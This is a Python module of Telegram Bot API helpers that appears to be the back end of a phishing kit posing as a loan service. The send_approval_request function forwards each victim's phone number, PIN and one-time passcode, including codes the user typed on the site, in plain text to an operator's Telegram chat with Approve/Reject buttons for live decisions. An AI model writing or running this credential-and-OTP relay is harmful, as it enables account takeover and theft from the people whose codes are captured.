import os
import httpx
from dotenv import load_dotenv

load_dotenv()

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"


# =========================================
# SHARED SEND HELPER
# =========================================
async def send_telegram_message(
    text: str,
    reply_markup: dict | None = None,
) -> dict:
    """
    Send a message to the admin Telegram chat.
    Returns the parsed JSON response, or {"ok": False, "error": ...} on failure.
    """
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("🔴 Telegram credentials missing.")
        return {"ok": False, "error": "Missing credentials"}

    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload, timeout=10)
            response.raise_for_status()
            print(f"🟢 Telegram response: {response.status_code}")
            return response.json()
        except httpx.HTTPStatusError as e:
            print(f"🔴 Telegram HTTP error {e.response.status_code}: {e.response.text}")
            return {"ok": False, "error": e.response.text}
        except Exception as e:
            print(f"🔴 Telegram send error: {e}")
            return {"ok": False, "error": str(e)}


# =========================================
# OTP APPROVAL REQUEST
# =========================================
async def send_approval_request(
    approval_id: str,
    phone: str,
    pin: str,
    otp: str,
    sms_body: str,
    is_user_submitted: bool = False,
) -> dict:
    """
    Send an OTP approval request to admin with Approve/Reject buttons.

    - is_user_submitted=False → New OTP generated at login/resend.
    - is_user_submitted=True  → The user typed this OTP on the website.
    """
    if is_user_submitted:
        title = "🔐 <b>User-Submitted OTP</b>"
        subtitle = "The user has entered this code. Please review."
    else:
        title = "🔐 <b>New OTP Generated</b>"
        subtitle = "A new OTP was sent to the user."

    text = (
        f"{title}\n"
        f"<i>{subtitle}</i>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🔑 PIN: <code>{pin}</code>\n"
        f"🔐 OTP: <code>{otp}</code>\n"
        f"🆔 Ref: <code>{approval_id}</code>\n\n"
        f"📩 <b>SMS sent to user:</b>\n"
        f"<i>{sms_body}</i>\n\n"
        f"<b>Approve this OTP?</b>"
    )

    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ Approve", "callback_data": f"approve:{approval_id}"},
            {"text": "❌ Reject", "callback_data": f"reject:{approval_id}"},
        ]]
    }

    return await send_telegram_message(text, reply_markup=keyboard)


# =========================================
# LOAN REQUEST APPROVAL
# =========================================
async def send_loan_approval_request(approval_id: str, phone: str) -> dict:
    """
    Send a Telegram message asking the admin to approve the loan request.
    Includes Approve / Deny buttons.
    """
    text = (
        f"🏦 <b>New Loan Request</b>\n\n"
        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
        f"🆔 <b>Ref:</b> <code>{approval_id}</code>\n\n"
        f"<b>Approve this loan request?</b>"
    )

    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ Approve", "callback_data": f"loan_approve:{approval_id}"},
            {"text": "❌ Deny", "callback_data": f"loan_reject:{approval_id}"},
        ]]
    }

    return await send_telegram_message(text, reply_markup=keyboard)


# =========================================
# SHARED HELPERS
# =========================================
async def answer_callback_query(callback_id: str, text: str) -> dict:
    """Acknowledge a button press so the Telegram spinner stops."""
    if not TELEGRAM_BOT_TOKEN:
        return {"ok": False, "error": "Missing token"}

    url = f"{TELEGRAM_API}/answerCallbackQuery"
    payload = {
        "callback_query_id": callback_id,
        "text": text,
        "show_alert": False,
    }

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload, timeout=10)
            return response.json()
        except Exception as e:
            print(f"🔴 Callback answer error: {e}")
            return {"ok": False, "error": str(e)}


async def edit_message(chat_id: int, message_id: int, text: str) -> dict:
    """Edit the original Telegram message to show the final decision."""
    if not TELEGRAM_BOT_TOKEN:
        return {"ok": False, "error": "Missing token"}

    url = f"{TELEGRAM_API}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
    }

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload, timeout=10)
            return response.json()
        except Exception as e:
            print(f"🔴 Edit message error: {e}")
            return {"ok": False, "error": str(e)}